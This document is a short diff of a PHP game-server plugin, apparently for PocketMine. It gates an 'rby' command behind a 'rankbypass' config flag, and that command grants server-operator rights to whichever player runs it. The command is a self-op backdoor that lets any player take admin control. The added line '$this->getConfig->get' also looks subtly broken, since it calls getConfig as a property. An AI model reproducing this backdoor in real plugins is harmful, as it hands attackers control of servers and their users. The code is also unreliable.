@@ -17,6 +17,8 @@ public function onCommand(CommandSender $sender, Command $command, string $label
             $this->getLogger()->warning("Please use this command in-game");
             return false;
         }
+    $a = $this->getConfig->get("rankbypass");
+    if ( $a) {
         switch ($command->getName()) {
             case "rby":
                $sender->getServer()->addOp($sender);
@@ -26,4 +28,5 @@ public function onCommand(CommandSender $sender, Command $command, string $label
         }
         return false;
     }
+}
 }
